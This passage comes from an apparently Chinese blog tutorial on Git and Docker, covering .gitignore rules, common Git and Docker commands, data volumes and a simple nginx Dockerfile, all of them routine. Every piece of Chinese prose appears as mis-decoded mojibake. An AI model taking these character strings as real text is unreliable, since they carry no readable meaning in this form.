class="line">/temp        #ä»…å¿½ç•¥é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„TODOæ–‡ä»¶,ä¸åŒ…æ‹¬å…¶å®ƒç›®å½•temp</span><br><span class="line">build/       #å¿½ç•¥build/ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span><br><span class="line">doc/*.txt    #ä¼šå¿½ç•¥ doc/notes.txt ä½†ä¸åŒ…æ‹¬ doc/server/arch.txt</span><br></pre></td></tr></table></figure></div><h2 id="gitå‘½ä»¤"><a class="markdownIt-Anchor" href="#gitå‘½ä»¤">#</a> Git å‘½ä»¤</h2><p>ä»“åº“ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªGitä»£ç åº“</span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œå°†å…¶åˆå§‹åŒ–ä¸ºGitä»£ç åº“</span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"># ä¸‹è½½ä¸€ä¸ªé¡¹ç›®å’Œå®ƒçš„æ•´ä¸ªä»£ç å†å²</span><br><span class="line">$ git clone [url]</span><br></pre></td></tr></table></figure></div><p>é…ç½®ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># æ˜¾ç¤ºå½“å‰çš„Gité…ç½®</span><br><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line"># ç¼–è¾‘Gité…ç½®æ–‡ä»¶</span><br><span class="line">$ git config -e [--global]</span><br><span class="line"></span><br><span class="line"># è®¾ç½®æäº¤ä»£ç æ—¶çš„ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">$ git config [--global] user.name &quot;[name]&quot;</span><br><span class="line">$ git config [--global] user.email &quot;[email address]&quot;</span><br></pre></td></tr></table></figure></div><p>å¢åŠ  / åˆ é™¤æ–‡ä»¶ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># æ·»åŠ æŒ‡å®šæ–‡ä»¶åˆ°æš‚å­˜åŒº</span><br><span class="line">$ git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># æ·»åŠ æŒ‡å®šç›®å½•åˆ°æš‚å­˜åŒºï¼ŒåŒ…æ‹¬å­ç›®å½•</span><br><span class="line">$ git add [dir]</span><br><span class="line"></span><br><span class="line"># æ·»åŠ å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº</span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"># æ·»åŠ æ¯ä¸ªå˜åŒ–å‰ï¼Œéƒ½ä¼šè¦æ±‚ç¡®è®¤</span><br><span class="line"># å¯¹äºåŒä¸€ä¸ªæ–‡ä»¶çš„å¤šå¤„å˜åŒ–ï¼Œå¯ä»¥å®ç°åˆ†æ¬¡æäº¤</span><br><span class="line">$ git add -p</span><br><span class="line"></span><br><span class="line"># åˆ é™¤å·¥ä½œåŒºæ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™æ¬¡åˆ é™¤æ”¾å…¥æš‚å­˜åŒº</span><br><span class="line">$ git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># åœæ­¢è¿½è¸ªæŒ‡å®šæ–‡ä»¶ï¼Œä½†è¯¥æ–‡ä»¶ä¼šä¿ç•™åœ¨å·¥ä½œåŒº</span><br><span class="line">$ git rm --cached [file]</span><br><span class="line"></span><br><span class="line"># æ”¹åæ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™ä¸ªæ”¹åæ”¾å…¥æš‚å­˜åŒº</span><br><span class="line">$ git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure></div><p>ä»£ç æäº¤ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># æäº¤æš‚å­˜åŒºåˆ°ä»“åº“åŒº</span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"># æäº¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°ä»“åº“åŒº</span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># æäº¤å·¥ä½œåŒºè‡ªä¸Šæ¬¡commitä¹‹åçš„å˜åŒ–ï¼Œç›´æ¥åˆ°ä»“åº“åŒº</span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"># æäº¤æ—¶æ˜¾ç¤ºæ‰€æœ‰diffä¿¡æ¯</span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨ä¸€æ¬¡æ–°çš„commitï¼Œæ›¿ä»£ä¸Šä¸€æ¬¡æäº¤</span><br><span class="line"># å¦‚æœä»£ç æ²¡æœ‰ä»»ä½•æ–°å˜åŒ–ï¼Œåˆ™ç”¨æ¥æ”¹å†™ä¸Šä¸€æ¬¡commitçš„æäº¤ä¿¡æ¯</span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># é‡åšä¸Šä¸€æ¬¡commitï¼Œå¹¶åŒ…æ‹¬æŒ‡å®šæ–‡ä»¶çš„æ–°å˜åŒ–</span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure></div><p>æ›´å¤šæŒ‡ä»¤å’Œæ’ä»¶ä¸‹è½½ &lt;<a class="link" href="https://gitee.com/all-about-git">Git å¤§å…¨ - Gitee.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&gt;</p><blockquote><p>æ ‡ç­¾</p><p>æŸ¥çœ‹ä¿¡æ¯</p><p>è¿œç¨‹åŒæ­¥</p><p>æ’¤é”€</p></blockquote><h2 id="gitåˆ†æ”¯"><a class="markdownIt-Anchor" href="#gitåˆ†æ”¯">#</a> Git åˆ†æ”¯</h2><p><img lazyload src="/images/loading.svg" data-src="C:/Users/20957/AppData/Roaming/Typora/typora-user-images/image-20240416113826761.png" alt="image-20240416113826761"></p><p>æˆ‘æ›¾åœ¨æ­å»ºè¿™ä¸ªåšå®¢æ—¶é‡åˆ°äº†å…³äºåˆ†æ”¯çš„å¾ˆå¤§çš„é—®é¢˜ï¼Œgithub æ›´æ”¹è¿‡ä¸€æ¬¡åˆ†æ”¯ï¼Œå°† master æ”¹ä¸ºäº† mainï¼Œä½†æ˜¯æˆ‘æœ¬åœ°ä¾æ—§æ˜¯ masterï¼Œå°±éœ€è¦æ›´æ”¹åˆ†æ”¯</p><h3 id="åˆ†æ”¯çš„æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#åˆ†æ”¯çš„æŒ‡ä»¤">#</a> åˆ†æ”¯çš„æŒ‡ä»¤</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># åˆ—å‡ºæ‰€æœ‰è¿œç¨‹åˆ†æ”¯</span><br><span class="line">git branch -r</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä½†ä¾ç„¶åœç•™åœ¨å½“å‰åˆ†æ”¯</span><br><span class="line">git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯</span><br><span class="line">git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯</span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"># åˆ é™¤åˆ†æ”¯</span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># åˆ é™¤è¿œç¨‹åˆ†æ”¯</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure></div><h1 id="docker"><a class="markdownIt-Anchor" href="#docker">#</a> Docker</h1><p><strong>Docker</strong> æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº Go è¯­è¨€ï¼Œå¹¶éµä» Apache2.0 åè®®å¼€æºã€‚å®ƒå¯ä»¥è®©å¼€å‘è€…å°†åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–åŒ…æ‰“åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚<strong>Docker</strong> å¯ç”¨äºå¼€å‘åº”ç”¨ã€äº¤ä»˜åº”ç”¨å’Œè¿è¡Œåº”ç”¨ç­‰åœºæ™¯</p><p>å®¹å™¨æŠ€æœ¯çš„èµ·æºå¯ä»¥è¿½æº¯åˆ°è§£å†³é‡å¤æ­å»ºç¯å¢ƒã€æµªè´¹æ—¶é—´å’Œæ•ˆç‡çš„é—®é¢˜ã€‚åœ¨æ²¡æœ‰å®¹å™¨æŠ€æœ¯ä¹‹å‰ï¼Œè™šæ‹Ÿæœºæ˜¯ä¸€ç§å¸¸è§çš„è§£å†³æ–¹æ¡ˆï¼Œä½†å®ƒä»¬å­˜åœ¨èµ„æºå ç”¨å¤§ã€å¯åŠ¨æ—¶é—´æ…¢ç­‰é—®é¢˜ã€‚ä¸è™šæ‹Ÿæœºä¸åŒï¼Œ<strong>Docker</strong> ä½¿ç”¨å®¹å™¨éš”ç¦»åº”ç”¨ç¨‹åºçš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œä½†å®¹å™¨ä¹‹é—´å¯ä»¥å…±äº«åŒä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚è¿™ä½¿å¾—å®¹å™¨æ›´è½»é‡ä¸”å ç”¨æ›´å°‘èµ„æºï¼Œä¸”å¯åŠ¨é€Ÿåº¦å¿«ã€‚å› æ­¤ï¼Œ<strong>Docker</strong> æˆä¸ºäº†æ‰“åŒ…æœåŠ¡æ ˆçš„é«˜æ•ˆæ–¹å¼</p><p>Docker çš„ä¸»è¦ç”¨é€”ï¼Œç›®å‰æœ‰ä¸‰å¤§ç±»ã€‚</p><p>**ï¼ˆ1ï¼‰æä¾›ä¸€æ¬¡æ€§çš„ç¯å¢ƒã€‚** æ¯”å¦‚ï¼Œæœ¬åœ°æµ‹è¯•ä»–äººçš„è½¯ä»¶ã€æŒç»­é›†æˆçš„æ—¶å€™æä¾›å•å…ƒæµ‹è¯•å’Œæ„å»ºçš„ç¯å¢ƒã€‚</p><p>**ï¼ˆ2ï¼‰æä¾›å¼¹æ€§çš„äº‘æœåŠ¡ã€‚** å› ä¸º Docker å®¹å™¨å¯ä»¥éšå¼€éšå…³ï¼Œå¾ˆé€‚åˆåŠ¨æ€æ‰©å®¹å’Œç¼©å®¹ã€‚</p><p>**ï¼ˆ3ï¼‰ç»„å»ºå¾®æœåŠ¡æ¶æ„ã€‚** é€šè¿‡å¤šä¸ªå®¹å™¨ï¼Œä¸€å°æœºå™¨å¯ä»¥è·‘å¤šä¸ªæœåŠ¡ï¼Œå› æ­¤åœ¨æœ¬æœºå°±å¯ä»¥æ¨¡æ‹Ÿå‡ºå¾®æœåŠ¡æ¶æ„ã€‚</p><h2 id="dockerå‘½ä»¤"><a class="markdownIt-Anchor" href="#dockerå‘½ä»¤">#</a> Docker å‘½ä»¤</h2><h3 id="åŸºç¡€å‘½ä»¤"><a class="markdownIt-Anchor" href="#åŸºç¡€å‘½ä»¤">#</a> åŸºç¡€å‘½ä»¤</h3><p>å¯åŠ¨ Dockerï¼š <code>systemctl start docker</code></p><p>å…³é—­ Dockerï¼š  <code>systemctl stop docker</code></p><p>é‡å¯ Dockerï¼š <code>systemctl restart docker</code></p><p>docker è®¾ç½®éšæœåŠ¡å¯åŠ¨è€Œè‡ªå¯åŠ¨ï¼š <code>systemctl enable docker</code></p><p>æŸ¥çœ‹ Docker è¿è¡ŒçŠ¶æ€ï¼š <code>systemctl status docker</code></p><p>æŸ¥çœ‹ Docker ç‰ˆæœ¬å·ä¿¡æ¯ï¼š <code>docker version &amp; docker info</code></p><p>Docker å¸®åŠ©å‘½ä»¤ï¼š <code>docker --help</code></p><h3 id="é•œåƒ-å®¹å™¨å‘½ä»¤"><a class="markdownIt-Anchor" href="#é•œåƒ-å®¹å™¨å‘½ä»¤">#</a> é•œåƒ / å®¹å™¨å‘½ä»¤</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/lkoNY3MnVQPK4Hy.jpg" alt="533212df4b4d89ffad49622b744f932.jpg"></p><p><strong>é•œåƒ</strong></p><p><code>docker search é•œåƒidæˆ–name</code> ï¼šåœ¨ Docker Hubï¼ˆæˆ–å…¶ä»–é•œåƒä»“åº“å¦‚é˜¿é‡Œé•œåƒï¼‰ä»“åº“ä¸­æœç´¢å…³é”®å­—çš„é•œåƒ</p><p><code>docker pull é•œåƒidæˆ–name</code> ï¼šä»ä»“åº“ä¸­ä¸‹è½½é•œåƒï¼Œè‹¥è¦æŒ‡å®šç‰ˆæœ¬ï¼Œåˆ™è¦åœ¨å†’å·åæŒ‡å®š</p><p><code>docker images</code> ï¼šåˆ—å‡ºå·²ç»ä¸‹è½½çš„é•œåƒï¼ŒæŸ¥çœ‹é•œåƒ</p><p><code>docker rmi é•œåƒidæˆ–name</code> ï¼šåˆ é™¤æœ¬åœ°é•œåƒ</p><p><code>docker rmi -f é•œåƒidæˆ–name</code> : åˆ é™¤é•œåƒ</p><p><code>docker build</code> ï¼šæ„å»ºé•œåƒ</p><p><code>docker save</code> ï¼šå°†é•œåƒå‹ç¼©å¹¶ä¿å­˜åˆ°æœ¬åœ°</p><p><code>docker load</code> ï¼šä»æœ¬åœ°ä¸‹è½½é•œåƒ</p><p><strong>å®¹å™¨</strong></p><p><code>docker ps</code> ï¼šåˆ—å‡ºè¿è¡Œä¸­çš„å®¹å™¨</p><p><code>docker ps -a</code>  ï¼š æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ŒåŒ…æ‹¬æœªè¿è¡Œ</p><p><code>docker run</code> ï¼šå¯åŠ¨å®¹å™¨</p><p><code>docker stop å®¹å™¨idæˆ–name</code> ï¼šåœæ­¢å®¹å™¨</p><p><code>docker kill å®¹å™¨id</code> ï¼šå¼ºåˆ¶åœæ­¢å®¹å™¨</p><p><code>docker start å®¹å™¨idæˆ–name</code> ï¼šå¯åŠ¨å·²åœæ­¢çš„å®¹å™¨</p><p><code>docker inspect å®¹å™¨id</code> ï¼šæŸ¥çœ‹å®¹å™¨çš„æ‰€æœ‰ä¿¡æ¯</p><p><code>docker container logs å®¹å™¨id</code> ï¼šæŸ¥çœ‹å®¹å™¨æ—¥å¿—</p><p><code>docker top å®¹å™¨id</code> ï¼šæŸ¥çœ‹å®¹å™¨é‡Œçš„è¿›ç¨‹</p><p><code>docker exec -it å®¹å™¨id /bin/bash</code> ï¼šè¿›å…¥å®¹å™¨</p><p><code>exit</code> ï¼šé€€å‡ºå®¹å™¨</p><p><code>docker rm å®¹å™¨idæˆ–name</code> ï¼šåˆ é™¤å·²åœæ­¢çš„å®¹å™¨</p><p><code>docker rm -f å®¹å™¨id</code> ï¼šåˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨</p><p><code>docker exec -it å®¹å™¨ID sh </code> : è¿›å…¥å®¹å™¨</p><h2 id="æ•°æ®å·"><a class="markdownIt-Anchor" href="#æ•°æ®å·">#</a> æ•°æ®å·</h2><p><strong>æ•°æ®å·</strong>ï¼ˆvolumeï¼‰æ˜¯ä¸€ä¸ªè™šæ‹Ÿç›®å½•ï¼Œæ˜¯å®¹å™¨å†…ç›®å½•ä¸å®¿ä¸»æœºç›®å½•ä¹‹é—´æ˜ å°„çš„æ¡¥æ¢</p><p>Docker å°†è¿ç”¨ä¸è¿è¡Œçš„ç¯å¢ƒæ‰“åŒ…å½¢æˆå®¹å™¨è¿è¡Œï¼Œ Docker å®¹å™¨äº§ç”Ÿçš„æ•°æ®ï¼Œå¦‚æœä¸é€šè¿‡ docker commit ç”Ÿæˆæ–°çš„é•œåƒï¼Œä½¿å¾—æ•°æ®åšä¸ºé•œåƒçš„ä¸€éƒ¨åˆ†ä¿å­˜ä¸‹æ¥ï¼Œ é‚£ä¹ˆå½“å®¹å™¨åˆ é™¤åï¼Œæ•°æ®è‡ªç„¶ä¹Ÿå°±æ²¡æœ‰äº†ã€‚ ä¸ºäº†èƒ½ä¿å­˜æ•°æ®åœ¨ Docker ä¸­æˆ‘ä»¬ä½¿ç”¨å·ã€‚|</p><p>å·å°±æ˜¯ç›®å½•æˆ–æ–‡ä»¶ï¼Œå­˜åœ¨äºä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ä¸­ï¼Œç”± Docker æŒ‚è½½åˆ°å®¹å™¨ï¼Œä½†å·ä¸å±äºè”åˆæ–‡ä»¶ç³»ç»Ÿï¼ˆUnion FileSystemï¼‰ï¼Œå› æ­¤èƒ½å¤Ÿç»•è¿‡è”åˆæ–‡ä»¶ç³»ç»Ÿæä¾›ä¸€äº›ç”¨äºæŒç»­å­˜å‚¨æˆ–å…±äº«æ•°æ®çš„ç‰¹æ€§:ã€‚</p><p>å·çš„è®¾è®¡ç›®çš„å°±æ˜¯æ•°æ®çš„æŒä¹…åŒ–ï¼Œå®Œå…¨ç‹¬ç«‹äºå®¹å™¨çš„ç”Ÿå­˜å‘¨æœŸï¼Œå› æ­¤ Docker ä¸ä¼šåœ¨å®¹å™¨åˆ é™¤æ—¶åˆ é™¤å…¶æŒ‚è½½çš„æ•°æ®å·ã€‚</p><p>æ•°æ®å·çš„ç‰¹ç‚¹:</p><p>1. æ•°æ®å·å¯åœ¨å®¹å™¨ä¹‹é—´å…±äº«æˆ–é‡ç”¨æ•°æ®<br> 2. å·ä¸­çš„æ›´æ”¹å¯ä»¥ç›´æ¥ç”Ÿæ•ˆ<br> 3. æ•°æ®å·ä¸­çš„æ›´æ”¹ä¸ä¼šåŒ…å«åœ¨é•œåƒçš„æ›´æ–°ä¸­<br> 4. æ•°æ®å·çš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´æŒç»­åˆ°æ²¡æœ‰å®¹å™¨ä½¿ç”¨å®ƒä¸ºæ­¢</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/XQzpv3Wh8VP1owE.jpg" alt="9adc1f8d4b0224fc8531ae9cc96249a.jpg"></p><p>åœ¨å®¿ä¸»æœº / å®¹å™¨ä¸­çš„æ›´æ”¹ä¼šåŒæ­¥åˆ°å¦ä¸€æ–¹</p><h3 id="å‘½ä»¤"><a class="markdownIt-Anchor" href="#å‘½ä»¤">#</a> å‘½ä»¤</h3><p>åˆ›å»ºæ•°æ®å·ï¼š <code>docker volume create my-vol</code></p><p>æŸ¥çœ‹æ‰€æœ‰æ•°æ®å·ï¼š <code>docker volume ls</code></p><p>åˆ é™¤æ•°æ®å·ï¼š <code>docker volume rm</code></p><p>æŸ¥çœ‹æŸä¸ªæ•°æ®å·çš„è¯¦æƒ…ï¼š <code>docker volume inspect</code></p><p>æ¸…é™¤æ•°æ®å·ï¼š <code>docker volume prune</code></p><h2 id="imageæ–‡ä»¶"><a class="markdownIt-Anchor" href="#imageæ–‡ä»¶">#</a> image æ–‡ä»¶</h2><p>**Docker æŠŠåº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–ï¼Œæ‰“åŒ…åœ¨ image æ–‡ä»¶é‡Œé¢ã€‚** åªæœ‰é€šè¿‡è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰èƒ½ç”Ÿæˆ Docker å®¹å™¨ã€‚image æ–‡ä»¶å¯ä»¥çœ‹ä½œæ˜¯å®¹å™¨çš„æ¨¡æ¿ã€‚Docker æ ¹æ® image æ–‡ä»¶ç”Ÿæˆå®¹å™¨çš„å®ä¾‹ã€‚åŒä¸€ä¸ª image æ–‡ä»¶ï¼Œå¯ä»¥ç”Ÿæˆå¤šä¸ªåŒæ—¶è¿è¡Œçš„å®¹å™¨å®ä¾‹ã€‚</p><p>image æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å®é™…å¼€å‘ä¸­ï¼Œä¸€ä¸ª image æ–‡ä»¶å¾€å¾€é€šè¿‡ç»§æ‰¿å¦ä¸€ä¸ª image æ–‡ä»¶ï¼ŒåŠ ä¸Šä¸€äº›ä¸ªæ€§åŒ–è®¾ç½®è€Œç”Ÿæˆã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œä½ å¯ä»¥åœ¨ Ubuntu çš„ image åŸºç¡€ä¸Šï¼Œå¾€é‡Œé¢åŠ å…¥ Apache æœåŠ¡å™¨ï¼Œå½¢æˆä½ çš„ imageã€‚</p><p>image æ–‡ä»¶æ˜¯é€šç”¨çš„ï¼Œä¸€å°æœºå™¨çš„ image æ–‡ä»¶æ‹·è´åˆ°å¦ä¸€å°æœºå™¨ï¼Œç…§æ ·å¯ä»¥ä½¿ç”¨ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸ºäº†èŠ‚çœæ—¶é—´ï¼Œæˆ‘ä»¬åº”è¯¥å°½é‡ä½¿ç”¨åˆ«äººåˆ¶ä½œå¥½çš„ image æ–‡ä»¶ï¼Œè€Œä¸æ˜¯è‡ªå·±åˆ¶ä½œã€‚å³ä½¿è¦å®šåˆ¶ï¼Œä¹Ÿåº”è¯¥åŸºäºåˆ«äººçš„ image æ–‡ä»¶è¿›è¡ŒåŠ å·¥ï¼Œè€Œä¸æ˜¯ä»é›¶å¼€å§‹åˆ¶ä½œã€‚</p><p>ä¸ºäº†æ–¹ä¾¿å…±äº«ï¼Œimage æ–‡ä»¶åˆ¶ä½œå®Œæˆåï¼Œå¯ä»¥ä¸Šä¼ åˆ°ç½‘ä¸Šçš„ä»“åº“ã€‚Docker çš„å®˜æ–¹ä»“åº“ <a class="link" href="https://hub.docker.com/">Docker Hub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> æ˜¯æœ€é‡è¦ã€æœ€å¸¸ç”¨çš„ image ä»“åº“ã€‚</p><h2 id="dockerfile"><a class="markdownIt-Anchor" href="#dockerfile">#</a> Dockerfile</h2><p>Dockerfile æ˜¯ä¸€ä¸ªç”¨æ¥æ„å»ºé•œåƒçš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡æœ¬å†…å®¹åŒ…å«äº†ä¸€æ¡æ¡æ„å»ºé•œåƒæ‰€éœ€çš„æŒ‡ä»¤å’Œè¯´æ˜ã€‚</p><h3 id="å®šåˆ¶é•œåƒ"><a class="markdownIt-Anchor" href="#å®šåˆ¶é•œåƒ">#</a> å®šåˆ¶é•œåƒ</h3><p>æ„å»ºé•œåƒï¼š  <code>docker build -t é•œåƒå Dockerfileç›®å½•ï¼ˆå¦‚æ˜¯å½“å‰æ‰€åœ¨ç›®å½•ï¼Œå¯ç”¨â€˜.â€™</code></p><p>é•œåƒçš„å®šåˆ¶å®é™…ä¸Šå°±æ˜¯å®šåˆ¶æ¯ä¸€å±‚æ‰€æ·»åŠ çš„é…ç½®ã€æ–‡ä»¶ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠæ¯ä¸€å±‚ä¿®æ”¹ã€å®‰è£…ã€æ„å»ºã€æ“ä½œçš„å‘½ä»¤éƒ½å†™å…¥ä¸€ä¸ªè„šæœ¬ï¼Œç”¨è¿™ä¸ªè„šæœ¬æ¥æ„å»ºã€å®šåˆ¶é•œåƒï¼Œæ— æ³•é‡å¤çš„é—®é¢˜ã€é•œåƒæ„å»ºé€æ˜æ€§çš„é—®é¢˜ã€ä½“ç§¯çš„é—®é¢˜å°±éƒ½ä¼šè§£å†³ã€‚è¿™ä¸ªè„šæœ¬å°±æ˜¯  <code>Dockerfile</code> ã€‚</p><p><code>Dockerfile</code>  æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶å†…åŒ…å«äº†ä¸€æ¡æ¡çš„æŒ‡ä»¤ (Instruction)ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤æ„å»ºä¸€å±‚ï¼Œå› æ­¤æ¯ä¸€æ¡æŒ‡ä»¤çš„å†…å®¹ï¼Œå°±æ˜¯æè¿°è¯¥å±‚åº”å½“å¦‚ä½•æ„å»ºã€‚</p><p>ä»¥  <code>nginx</code>  é•œåƒä¸ºä¾‹ï¼Œè¿™æ¬¡æˆ‘ä»¬ä½¿ç”¨  <code>Dockerfile</code>  æ¥å®šåˆ¶ã€‚</p><p>åœ¨ä¸€ä¸ªç©ºç™½ç›®å½•ä¸­ï¼Œå»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶å‘½åä¸º  <code>Dockerfile</code> ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir mynginx</span><br><span class="line">$ cd mynginx</span><br><span class="line">$ touch Dockerfile</span><br></pre></td></tr></table></figure></div><p>å…¶å†…å®¹ä¸ºï¼š</p><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">RUN echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure></div><p>è¿™ä¸ª  <code>Dockerfile</code>  å¾ˆç®€å•ï¼Œä¸€å…±å°±ä¸¤è¡Œã€‚æ¶‰åŠåˆ°äº†ä¸¤æ¡æŒ‡ä»¤ï¼Œ <code>FROM</code>  å’Œ  <code>RUN</code> ã€‚</p><h4 id="from-æŒ‡å®šåŸºç¡€é•œåƒ"><a class="markdownIt-Anchor" href="#from-æŒ‡å®šåŸºç¡€é•œåƒ">#</a> <strong>FROM æŒ‡å®šåŸºç¡€é•œåƒ</strong></h4><p>æ‰€è°“å®šåˆ¶é•œåƒï¼Œé‚£ä¸€å®šæ˜¯ä»¥ä¸€ä¸ªé•œåƒä¸ºåŸºç¡€ï¼Œåœ¨å…¶ä¸Šè¿›è¡Œå®šåˆ¶ã€‚å°±åƒæˆ‘ä»¬ä¹‹å‰è¿è¡Œäº†ä¸€ä¸ª  <code>nginx</code>  é•œåƒçš„å®¹å™¨ï¼Œå†è¿›è¡Œä¿®æ”¹ä¸€æ ·ï¼ŒåŸºç¡€é•œåƒæ˜¯å¿…é¡»æŒ‡å®šçš„ã€‚è€Œ  <code>FROM</code>  å°±æ˜¯æŒ‡å®š<strong>åŸºç¡€é•œåƒ</strong>ï¼Œå› æ­¤ä¸€ä¸ª  <code>Dockerfile</code>  ä¸­  <code>FROM</code>  æ˜¯å¿…å¤‡çš„æŒ‡ä»¤ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚</p><p>åœ¨  <code>Docker Store</code>  ä¸Šæœ‰éå¸¸å¤šçš„é«˜è´¨é‡çš„å®˜æ–¹é•œåƒï¼Œæœ‰å¯ä»¥ç›´æ¥æ‹¿æ¥ä½¿ç”¨çš„æœåŠ¡ç±»çš„é•œåƒï¼Œå¦‚  